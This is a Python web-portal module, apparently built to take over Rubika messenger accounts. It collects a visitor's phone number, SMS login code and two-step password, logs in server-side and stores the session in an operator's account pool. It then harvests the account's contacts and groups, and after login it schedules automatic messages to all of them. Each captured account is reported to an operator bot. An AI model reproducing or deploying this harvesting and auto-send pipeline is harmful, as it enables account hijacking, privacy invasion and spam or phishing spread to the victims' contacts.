"""Production portal HTTP/login orchestration, isolated from the legacy core."""
from __future__ import annotations

import asyncio
import contextlib
import hashlib
import hmac
import re
import secrets
import time
import traceback

import config
import db
import rubika_client as rb
import worker

from . import account_store, net as portal_net, observer, post_login_send, stats
from . import status as portal_status
from .page import PAGE_HTML

try:
    import crypto_util
    _HAVE_CRYPTO = True
except Exception:  # pragma: no cover
    _HAVE_CRYPTO = False

try:
    from fastapi import FastAPI, Request
    from fastapi.responses import HTMLResponse, JSONResponse
    import uvicorn
    _HAVE_WEB = True
except ImportError:  # pragma: no cover
    _HAVE_WEB = False

TTL_SECONDS = 300
MAX_WRONG_CODES = 3
USER_ERR = "خطایی رخ داد، دوباره تلاش کن"
OK_PREFIX = ("091", "099", "090", "092", "093", "094")
_LINE = "-------------------------------"

_attempts: dict[str, dict] = {}
_locks: dict[str, asyncio.Lock] = {}
_gate: asyncio.Lock | None = None
_current: dict = {"tunnel": None, "server": None, "server_task": None}
_control: dict = {"restart": False}
_runtime_bot = None


def is_enabled() -> bool:
    value = db.get_setting("portal_enabled", None)
    if value is None:
        return bool(getattr(config, "PORTAL_ENABLED", True))
    return str(value).lower() not in ("0", "false", "")


def get_mode() -> str:
    mode = (db.get_setting("portal_mode", None) or getattr(config, "PORTAL_MODE", "quick")).strip().lower()
    return "domain" if mode == "domain" else "quick"


def get_port() -> int:
    value = db.get_setting("portal_port", None)
    with contextlib.suppress(Exception):
        if value:
            return int(value)
    return int(getattr(config, "PORTAL_PORT", 8080))


def request_restart() -> None:
    _control["restart"] = True


def _global_gate() -> asyncio.Lock:
    global _gate
    if _gate is None:
        _gate = asyncio.Lock()
    return _gate


def _lock_for(attempt_id: str) -> asyncio.Lock:
    return _locks.setdefault(attempt_id, asyncio.Lock())


def _owner_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()


def _valid_phone(raw: str) -> bool:
    return bool(re.fullmatch(r"09\d{9}", raw)) and raw.startswith(OK_PREFIX)


def _remaining(attempt: dict) -> int:
    return max(0, int(attempt["expires_at"] - time.time() + 0.999))


def _payload(attempt: dict, **extra) -> dict:
    data = {
        "attempt_id": attempt["id"],
        "attempt_token": attempt["token"],
        "expires_in": _remaining(attempt),
    }
    data.update(extra)
    return data


async def _body(req: Request) -> dict:
    try:
        value = await req.json()
        return value if isinstance(value, dict) else {}
    except Exception:
        return {}


async def _err(bot, stage: str, endpoint: str, phone: str | None, exc: Exception) -> None:
    try:
        tb = traceback.extract_tb(exc.__traceback__)
        last = tb[-1] if tb else None
        where = f"{last.filename.split('/')[-1]}:{last.lineno}" if last else "-"
        await bot.log(bot.card("⚠️ - #Portal_Error", [
            "#portal #error", _LINE, f"🔧 مرحله: {stage}", f"🔗 Endpoint: {endpoint}",
            f"📱 Phone: {phone or '-'}", f"💥 {type(exc).__name__}: {str(exc)[:180]}",
            f"🧩 Where: {where}", f"🕒 {config.now_str()}",
        ]))
    except Exception as log_exc:
        print(f"[portal error log failed] {log_exc}")


async def _disconnect_ctx(ctx: dict | None) -> bool:
    client = (ctx or {}).get("client")
    if client is None:
        return True
    try:
        await asyncio.wait_for(client.disconnect(), timeout=10)
        connected = getattr(client, "is_connected", None)
        if callable(connected):
            connected = connected()
        return not bool(connected)
    except Exception:
        return False


async def _retire_lock(attempt_id: str, lock: asyncio.Lock) -> None:
    """Drop a retired lock only after its owner and every queued waiter left."""
    while lock.locked():
        await asyncio.sleep(0.05)
    if _locks.get(attempt_id) is lock and attempt_id not in _attempts:
        _locks.pop(attempt_id, None)


async def _remove_attempt(attempt_id: str) -> tuple[dict | None, bool]:
    async with _global_gate():
        attempt = _attempts.pop(attempt_id, None)
    disconnected = True
    if attempt:
        disconnected = await _disconnect_ctx(attempt.get("ctx"))
        attempt["ctx"] = None
    lock = _locks.get(attempt_id)
    if lock:
        asyncio.create_task(_retire_lock(attempt_id, lock))
    return attempt, disconnected


async def _expire_held(attempt: dict) -> bool:
    """Expire an attempt while its per-attempt lock is already held."""
    attempt_id = attempt["id"]
    await _disconnect_ctx(attempt.get("ctx"))
    attempt["ctx"] = None
    stats.finish(attempt_id, "expired", error="TTL 300s reached")
    if _runtime_bot is not None:
        await _safe_log(_runtime_bot, "⌛ - #Portal_Expired", [
            f"📱 {attempt['phone'][:4]}•••{attempt['phone'][-3:]}",
            "⏳ مدت انتظار: 300 ثانیه", "✅ client/context/lock cleanup شد",
        ])
    async with _global_gate():
        _attempts.pop(attempt_id, None)
    lock = _locks.get(attempt_id)
    if lock:
        asyncio.create_task(_retire_lock(attempt_id, lock))
    return True


async def _expire_attempt(attempt_id: str, *, force: bool = False) -> bool:
    attempt = _attempts.get(attempt_id)
    if not attempt or (not force and time.time() < attempt["expires_at"]):
        return False
    lock = _lock_for(attempt_id)
    async with lock:
        attempt = _attempts.get(attempt_id)
        if not attempt or (not force and time.time() < attempt["expires_at"]):
            return False
        return await _expire_held(attempt)


async def cleanup_expired() -> None:
    now = time.time()
    expired = [
        _expire_attempt(attempt_id)
        for attempt_id, attempt in list(_attempts.items())
        if now >= attempt["expires_at"]
    ]
    if expired:
        await asyncio.gather(*expired, return_exceptions=True)


async def _close_all_attempts(reason: str) -> None:
    for attempt_id in list(_attempts):
        lock = _lock_for(attempt_id)
        async with lock:
            attempt = _attempts.get(attempt_id)
            if not attempt:
                continue
            await _disconnect_ctx(attempt.get("ctx"))
            stats.finish(attempt_id, "failed", error=reason)
            async with _global_gate():
                _attempts.pop(attempt_id, None)
            asyncio.create_task(_retire_lock(attempt_id, lock))


def _resolve_attempt(body: dict, req: Request | None = None) -> tuple[dict | None, str | None]:
    attempt_id = str(body.get("attempt_id") or "").strip()
    token = str(body.get("attempt_token") or body.get("owner_token") or "").strip()
    if not token and req is not None:
        token = str(req.cookies.get("portal_attempt_token") or "")
    if attempt_id:
        attempt = _attempts.get(attempt_id)
        if not attempt:
            return None, "درخواست پیدا نشد یا منقضی شده است"
        if not token or not hmac.compare_digest(attempt["token"], token):
            return None, "مالکیت درخواست تأیید نشد"
        return attempt, None
    # Backward-compatible phone payloads are accepted only with the secure
    # HttpOnly owner cookie issued by /api/start.
    phone = rb.normalize_phone(str(body.get("phone") or ""))
    matches = [item for item in _attempts.values() if item["phone"] == phone]
    if len(matches) == 1 and token and hmac.compare_digest(matches[0]["token"], token):
        return matches[0], None
    return None, "درخواست پیدا نشد یا مالکیت آن تأیید نشد؛ دوباره شروع کنید"


async def _fresh_attempt(req: Request, body: dict) -> tuple[dict | None, JSONResponse | None]:
    if not is_enabled():
        return None, JSONResponse({"error": "سرویس موقتاً غیرفعال است", "code": "portal_off"}, status_code=503)
    attempt, error = _resolve_attempt(body, req)
    if error:
        return None, JSONResponse({"error": error, "code": "attempt_not_found"}, status_code=400)
    if time.time() >= attempt["expires_at"]:
        await _expire_attempt(attempt["id"])
        return None, JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
    return attempt, None


def _wrong_code_error(exc: Exception) -> bool:
    text = f"{type(exc).__name__} {exc}".upper().replace("-", "_")
    if any(token in text for token in ("INVALID_AUTH", "AUTH_FROM_ANOTHER", "NOT_REGISTERED")):
        return False
    return any(token in text for token in (
        "WRONG_CODE", "INVALID_CODE", "CODE_INVALID", "PHONE_CODE_INVALID",
        "CODE IS INVALID", "CODE IS WRONG", "کد اشتباه", "کد نامعتبر",
    )) or ("SIGN_IN STATUS" in text and "OK" not in text)


def _transient_error(exc: Exception) -> bool:
    text = f"{type(exc).__name__} {exc}".upper()
    return isinstance(exc, (asyncio.TimeoutError, TimeoutError, ConnectionError, OSError)) or any(
        token in text for token in ("TIMEOUT", "NETWORK", "CONNECTION", "TEMPORAR", "FLOOD", "SERVER", "TRANSPORT")
    )


def _password_error(exc: Exception) -> bool:
    text = f"{type(exc).__name__} {exc}".upper()
    return "PASS" in text and ("NEED" in text or "REQUIRED" in text)


async def _safe_log(bot, title: str, rows: list[str]) -> bool:
    try:
        await asyncio.wait_for(bot.log(bot.card(title, rows)), timeout=8)
        return True
    except Exception as exc:
        print(f"[portal log failed] {type(exc).__name__}: {exc}")
        return False


def _expired(attempt: dict) -> bool:
    return time.time() >= float(attempt["expires_at"])


def _is_current(attempt: dict) -> bool:
    return _attempts.get(attempt["id"]) is attempt


def _require_time(attempt: dict) -> None:
    if _expired(attempt):
        raise asyncio.TimeoutError("portal attempt TTL 300s reached")


async def _save_account(bot, ctx: dict, attempt: dict) -> dict:
    client, phone = ctx["client"], ctx["phone"]
    _require_time(attempt)
    if any(item["phone"] == phone for item in db.list_accounts()):
        raise RuntimeError("account was registered by another active flow")
    me = await asyncio.wait_for(client.get_me(), timeout=min(45, max(1, _remaining(attempt))))
    _require_time(attempt)
    guid = rb._guid_of(me) or "-"
    name = rb._name_of(me)
    ordered, recipient_stats = await asyncio.wait_for(
        rb.get_ordered_recipients(client), timeout=min(120, max(1, _remaining(attempt)))
    )
    _require_time(attempt)
    master = worker.ensure_master_worker() or {}
    session_values = bot._session_values(client, phone, guid)
    _require_time(attempt)
    account_id = account_store.save_atomic(
        phone=phone, name=name, user_id=str(guid), session_path=rb.session_path(phone),
        session_values=session_values, worker_id=int(master.get("id") or 0),
        contacts=int(recipient_stats.get("contacts") or 0),
        groups=int(recipient_stats.get("groups") or 0),
    )
    log_ok = await _safe_log(bot, "🔐 - #Portal_Account_Added", [
        f"📱 Phone: {phone}", f"• Account ID: {account_id}", f"• Name: {name}",
        "• Session: ذخیره شد", f"📇 Contacts: {recipient_stats['contacts']} | 👥 Groups: {recipient_stats['groups']}",
        f"👨‍🔧 Worker: {master.get('tag', '-')}", f"🕒 {config.now_str()}",
    ])
    return {
        "account_id": account_id, "name": name, "phone": phone,
        "recipients": [item["guid"] for item in ordered], "log_ok": log_ok,
    }


def _build_app(bot):
    app = FastAPI()

    @app.get("/", response_class=HTMLResponse)
    async def home():
        if not is_enabled():
            return HTMLResponse("<h3 style='font-family:sans-serif;text-align:center;margin-top:40px'>سرویس موقتاً غیرفعال است.</h3>", status_code=503)
        return HTMLResponse(PAGE_HTML)

    @app.get("/ping")
    async def ping():
        return {"ok": True, "status": portal_status.snapshot()["status"]}

    @app.get("/api/status")
    async def api_status():
        return {"ok": True, **portal_status.snapshot(), "stats": stats.summary()}

    @app.get("/api/stats")
    async def api_stats():
        return {"ok": True, **stats.summary()}

    @app.post("/api/cancel")
    async def api_cancel(req: Request):
        body = await _body(req)
        attempt, error = _resolve_attempt(body)
        if error:
            return JSONResponse({"ok": True})  # idempotent for stale/legacy clients
        lock = _lock_for(attempt["id"])
        async with lock:
            current = _attempts.get(attempt["id"])
            if current is attempt:
                await _disconnect_ctx(current.get("ctx"))
                current["ctx"] = None
                stats.finish(current["id"], "failed", error="cancelled by user")
                async with _global_gate():
                    _attempts.pop(current["id"], None)
        asyncio.create_task(_retire_lock(attempt["id"], lock))
        return JSONResponse({"ok": True})

    @app.post("/api/start")
    async def api_start(req: Request):
        body = await _body(req)
        raw = str(body.get("phone") or "").strip()
        if not is_enabled():
            return JSONResponse({"error": "سرویس موقتاً غیرفعال است", "code": "portal_off"}, status_code=503)
        if not _valid_phone(raw):
            return JSONResponse({"error": "شماره موبایل معتبر نیست", "code": "invalid_phone"}, status_code=400)
        phone = rb.normalize_phone(raw)
        attempt_id, token = secrets.token_urlsafe(18), secrets.token_urlsafe(32)
        created = time.time()
        attempt = {
            "id": attempt_id, "token": token, "phone": phone, "ctx": None,
            "created_at": created, "expires_at": created + TTL_SECONDS,
            "stage": "starting", "tries": 0,
        }
        async with _global_gate():
            if any(item["phone"] == phone for item in db.list_accounts()):
                return JSONResponse({"error": "این شماره قبلاً ثبت شده", "code": "duplicate"}, status_code=409)
            if any(item["phone"] == phone for item in _attempts.values()):
                return JSONResponse({"error": "برای این شماره یک درخواست فعال وجود دارد", "code": "phone_busy"}, status_code=409)
            if len(_attempts) >= int(getattr(config, "MAX_PORTAL_LOGINS", 5)):
                return JSONResponse({"error": "سرویس موقتاً شلوغ است", "code": "capacity"}, status_code=429)
            try:
                stats.create_attempt(attempt_id, phone, _owner_hash(token), created, created + TTL_SECONDS)
            except Exception as exc:
                print(f"[portal attempt persistence failed] {type(exc).__name__}: {exc}")
                return JSONResponse({"error": USER_ERR, "code": "storage_failed"}, status_code=503)
            _attempts[attempt_id] = attempt
            _lock_for(attempt_id)
        try:
            async with _lock_for(attempt_id):
                ctx = await asyncio.wait_for(rb.start_login(phone), timeout=60)
                if time.time() >= attempt["expires_at"]:
                    await _disconnect_ctx(ctx)
                    attempt["ctx"] = None
                else:
                    attempt["ctx"] = ctx
                    state = str(ctx.get("status") or "").upper()
                    if "PASS" in state:
                        attempt["stage"] = "password"
                        return JSONResponse(_payload(attempt, next="password"))
                    if not ctx.get("phone_code_hash"):
                        raise RuntimeError("Rubika did not return phone_code_hash")
                    attempt["stage"] = "code"
                    stats.mark_started(attempt_id)
                    await _safe_log(bot, "📥 - #Portal_Request", [
                        f"📱 {phone[:4]}•••{phone[-3:]}", f"🆔 {attempt_id[:10]}",
                        "⏳ مهلت: دقیقاً 300 ثانیه", f"🕒 {config.now_str()}",
                    ])
                    return JSONResponse(_payload(attempt, next="code"))
            await _expire_attempt(attempt_id)
            return JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
        except Exception as exc:
            stats.finish(attempt_id, "failed", error=repr(exc))
            await _remove_attempt(attempt_id)
            await _err(bot, "start_login", "/api/start", phone, exc)
            return JSONResponse({"error": USER_ERR, "code": "start_failed"}, status_code=502)

    @app.post("/api/password")
    async def api_password(req: Request):
        body = await _body(req)
        attempt, response = await _fresh_attempt(req, body)
        if response:
            return response
        password = str(body.get("password") or "")
        if not password:
            return JSONResponse({"error": "رمز را وارد کنید", "code": "password_required"}, status_code=400)
        async with _lock_for(attempt["id"]):
            if not _is_current(attempt):
                return JSONResponse({"error": "درخواست بسته شده است؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            if time.time() >= attempt["expires_at"]:
                await _expire_held(attempt)
                return JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            try:
                if not await _disconnect_ctx(attempt.get("ctx")):
                    return JSONResponse(_payload(attempt, error="اتصال قبلی هنوز بسته نشده؛ دوباره تلاش کنید", code="disconnect_pending", retryable=True), status_code=503)
                attempt["ctx"] = None
                attempt["ctx"] = await asyncio.wait_for(rb.start_login(attempt["phone"], pass_key=password), timeout=60)
                if not attempt["ctx"].get("phone_code_hash"):
                    raise RuntimeError("password accepted but code was not sent")
                attempt["stage"] = "code"
                stats.mark_started(attempt["id"])
                return JSONResponse(_payload(attempt, next="code"))
            except Exception as exc:
                attempt["ctx"] = None
                await _err(bot, "password", "/api/password", attempt["phone"], exc)
                return JSONResponse(_payload(attempt, error="رمز پذیرفته نشد؛ دوباره تلاش کنید", code="password_failed"), status_code=400)

    @app.post("/api/resend")
    async def api_resend(req: Request):
        body = await _body(req)
        attempt, response = await _fresh_attempt(req, body)
        if response:
            return response
        async with _lock_for(attempt["id"]):
            if not _is_current(attempt):
                return JSONResponse({"error": "درخواست بسته شده است؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            if time.time() >= attempt["expires_at"]:
                await _expire_held(attempt)
                return JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            try:
                if not await _disconnect_ctx(attempt.get("ctx")):
                    return JSONResponse(_payload(attempt, error="اتصال قبلی هنوز بسته نشده؛ دوباره تلاش کنید", code="disconnect_pending", retryable=True), status_code=503)
                attempt["ctx"] = None
                attempt["ctx"] = await asyncio.wait_for(rb.start_login(attempt["phone"]), timeout=60)
                state = str(attempt["ctx"].get("status") or "").upper()
                if "PASS" in state:
                    attempt["stage"] = "password"
                    return JSONResponse(_payload(attempt, ok=True, next="password"))
                if not attempt["ctx"].get("phone_code_hash"):
                    raise RuntimeError("Rubika did not return phone_code_hash")
                attempt["stage"] = "code"
                stats.mark_started(attempt["id"])
                return JSONResponse(_payload(attempt, ok=True, next="code"))
            except Exception as exc:
                attempt["ctx"] = None
                await _err(bot, "resend", "/api/resend", attempt["phone"], exc)
                return JSONResponse(_payload(attempt, error=USER_ERR, code="resend_failed"), status_code=502)

    @app.post("/api/code")
    async def api_code(req: Request):
        body = await _body(req)
        attempt, response = await _fresh_attempt(req, body)
        if response:
            return response
        code = "".join(ch for ch in str(body.get("code") or "") if ch.isdigit())
        if len(code) != 6:
            return JSONResponse(_payload(attempt, error="کد باید شش‌رقمی باشد", code="invalid_code_format"), status_code=400)
        async with _lock_for(attempt["id"]):
            if not _is_current(attempt):
                return JSONResponse({"error": "درخواست بسته شده است؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            if time.time() >= attempt["expires_at"]:
                await _expire_held(attempt)
                return JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            if not attempt.get("ctx"):
                return JSONResponse(_payload(attempt, error="ابتدا کد جدید دریافت کنید", code="missing_context"), status_code=400)
            try:
                await asyncio.wait_for(rb.finish_login(attempt["ctx"], code), timeout=min(60, max(1, _remaining(attempt))))
                if _expired(attempt):
                    await _expire_held(attempt)
                    return JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            except Exception as exc:
                if _password_error(exc):
                    attempt["stage"] = "password"
                    return JSONResponse(_payload(attempt, next="password", error="رمز دومرحله‌ای لازم است", code="password_required"), status_code=400)
                if _wrong_code_error(exc):
                    attempt["tries"] += 1
                    count = stats.wrong_code(attempt["id"], type(exc).__name__)
                    await _safe_log(bot, "🔢 - #Portal_Wrong_Code", [
                        f"📱 {attempt['phone'][:4]}•••{attempt['phone'][-3:]}",
                        f"❌ تلاش: {count}/{MAX_WRONG_CODES}", f"⏳ باقی‌مانده: {_remaining(attempt)} ثانیه",
                    ])
                    if count >= MAX_WRONG_CODES:
                        stats.finish(attempt["id"], "failed", error="wrong code limit")
                        await _remove_attempt(attempt["id"])
                        return JSONResponse({"error": "سقف کد اشتباه تمام شد؛ دوباره شروع کنید", "code": "wrong_code_limit"}, status_code=400)
                    return JSONResponse(_payload(attempt, error=f"کد اشتباه است؛ {MAX_WRONG_CODES-count} فرصت باقی مانده", code="wrong_code", wrong_code_events=count), status_code=400)
                if _transient_error(exc):
                    await _err(bot, "code/transient", "/api/code", attempt["phone"], exc)
                    return JSONResponse(_payload(attempt, error="ارتباط موقتاً قطع شد؛ همین کد را دوباره امتحان کنید", code="temporary_error", retryable=True), status_code=503)
                stats.finish(attempt["id"], "failed", error=repr(exc))
                await _remove_attempt(attempt["id"])
                await _err(bot, "code/definitive", "/api/code", attempt["phone"], exc)
                return JSONResponse({"error": USER_ERR, "code": "login_failed"}, status_code=502)
            try:
                saved = await _save_account(bot, attempt["ctx"], attempt)
            except asyncio.TimeoutError:
                await _expire_held(attempt)
                return JSONResponse({"error": "مهلت ۵ دقیقه‌ای تمام شد؛ دوباره شروع کنید", "code": "expired"}, status_code=410)
            except Exception as exc:
                stats.finish(attempt["id"], "failed", error=repr(exc))
                await _remove_attempt(attempt["id"])
                await _err(bot, "account/session/worker persistence", "/api/code", attempt["phone"], exc)
                return JSONResponse({"error": "ذخیره حساب کامل نشد؛ دوباره تلاش کنید", "code": "save_failed"}, status_code=500)
            try:
                stats.finish(attempt["id"], "success", account_id=saved["account_id"])
            except Exception as exc:
                await _err(bot, "stats-after-save", "/api/code", attempt["phone"], exc)
            account_id, phone, recipients = saved["account_id"], saved["phone"], saved["recipients"]
            _removed, disconnected = await _remove_attempt(attempt["id"])
            job_id = None
            if disconnected:
                try:
                    job_id = post_login_send.schedule(account_id, phone, recipients)
                except Exception as exc:
                    await _err(bot, "post-login-send-after-save", "/api/code", phone, exc)
            else:
                await _err(bot, "login-client-disconnect", "/api/code", phone, RuntimeError("login client did not disconnect; auto-send was not started"))
            return JSONResponse({"ok": True, "account_id": account_id, "phone": phone, "auto_send_job": job_id})

    return app


def _domain_token() -> str:
    if not _HAVE_CRYPTO:
        return ""
    try:
        encrypted = db.get_setting("cf_token_enc", "") or ""
        return crypto_util.decrypt(encrypted) if encrypted else ""
    except Exception:
        return ""


async def _stop_runtime() -> None:
    proc = _current.get("tunnel")
    _current["tunnel"] = None
    await portal_net.stop_process(proc)
    server = _current.get("server")
    task = _current.get("server_task")
    if server is not None:
        server.should_exit = True
    if task is not None and not task.done():
        try:
            await asyncio.wait_for(task, timeout=20)
        except asyncio.TimeoutError:
            task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await task
    _current.update({"server": None, "server_task": None})
    with contextlib.suppress(Exception):
        db.set_setting("portal_tunnel_url", "")


async def _serve_once(bot) -> str:
    mode, port = get_mode(), get_port()
    portal_status.set_state("starting", mode=mode, url="", server=False, tunnel=False, detail="starting server")
    with contextlib.suppress(Exception):
        db.set_setting("portal_tunnel_url", "")
    server = uvicorn.Server(uvicorn.Config(_build_app(bot), host="127.0.0.1", port=port, log_level="warning"))
    server_task = asyncio.create_task(server.serve())
    _current.update({"server": server, "server_task": server_task})
    if not await portal_net.verify_local(port, timeout=30):
        raise portal_net.TunnelError("web-server", "localhost /ping آماده نشد")
    if server_task.done():
        exc = server_task.exception()
        raise portal_net.TunnelError("web-server", f"uvicorn متوقف شد: {exc!r}")
    portal_status.update(server=True, detail="localhost /ping ok; starting cloudflared")
    if mode == "domain":
        proc, url, checks = await portal_net.start_domain(
            port, db.get_setting("portal_domain", "") or "", _domain_token(),
        )
    else:
        proc, url, checks = await portal_net.start_quick(port)
    _current["tunnel"] = proc
    db.set_setting("portal_tunnel_url", url)
    portal_status.set_state(
        "running", mode=mode, url=url, server=True, tunnel=True,
        dns=checks.get("dns", "ok"), ssl=checks.get("ssl", "ok"),
        domain_ping=checks.get("domain_ping", "ok"), detail="ready",
    )
    await _safe_log(bot, "🌍 - Portal Online", [
        f"🔧 {'Custom Domain' if mode == 'domain' else 'Quick Tunnel'}", f"🔗 {url}", f"🕒 {config.now_str()}",
    ])
    outcome = "restart"
    next_public_check = time.monotonic() + 30
    public_failures = 0
    while True:
        if not is_enabled():
            outcome = "off"
            break
        if _control.get("restart"):
            _control["restart"] = False
            outcome = "restart"
            break
        if server_task.done():
            raise portal_net.TunnelError("web-server", "uvicorn unexpectedly stopped")
        if proc.returncode is not None:
            raise portal_net.TunnelError("tunnel", f"cloudflared exited ({proc.returncode})")
        if time.monotonic() >= next_public_check:
            next_public_check = time.monotonic() + 30
            if await portal_net.verify_url(url, timeout=8):
                public_failures = 0
                portal_status.update(detail="ready", domain_ping="ok")
            else:
                public_failures += 1
                portal_status.update(detail=f"public /ping failed ({public_failures}/3)", domain_ping="failed")
                if public_failures >= 3:
                    raise portal_net.TunnelError("health", "public /ping سه بار پیاپی پاسخ نداد")
        await asyncio.sleep(1)
    return outcome


async def run_portal() -> None:
    """Single portal lifecycle: server -> localhost ping -> tunnel -> public ping."""
    global _runtime_bot
    import bot
    _runtime_bot = bot
    with contextlib.suppress(Exception):
        from . import panel
        panel.register(bot)
    if not _HAVE_WEB:
        await _safe_log(bot, "⚠️ - #Portal_Error", ["fastapi/uvicorn در دسترس نیست"])
        return
    stats.init()
    post_login_send.init()
    observer_task = asyncio.create_task(observer.run(bot, cleanup_expired))
    with contextlib.suppress(Exception):
        await post_login_send.restore_pending()
    try:
        while True:
            if not is_enabled():
                portal_status.clear_runtime("off")
                await asyncio.sleep(1)
                continue
            outcome = "failed"
            try:
                outcome = await _serve_once(bot)
            except asyncio.CancelledError:
                raise
            except portal_net.TunnelError as exc:
                portal_status.clear_runtime("failed", f"{exc.stage}: {exc.detail}")
                await _safe_log(bot, "⚠️ - #Portal_Error", [f"🔧 {exc.stage}", f"📝 {exc.detail}"])
            except Exception as exc:
                portal_status.clear_runtime("failed", repr(exc)[:180])
                await _err(bot, "run_portal", "lifecycle", None, exc)
            finally:
                await _close_all_attempts("portal lifecycle stopped")
                await _stop_runtime()
            if outcome == "off":
                portal_status.clear_runtime("off")
            elif outcome == "restart":
                portal_status.clear_runtime("starting", "restart requested")
            await asyncio.sleep(1 if outcome in ("off", "restart") else 5)
    finally:
        observer_task.cancel()
        with contextlib.suppress(asyncio.CancelledError):
            await observer_task
        await _close_all_attempts("portal shutdown")
        await _stop_runtime()
        portal_status.clear_runtime("off")
        _runtime_bot = None
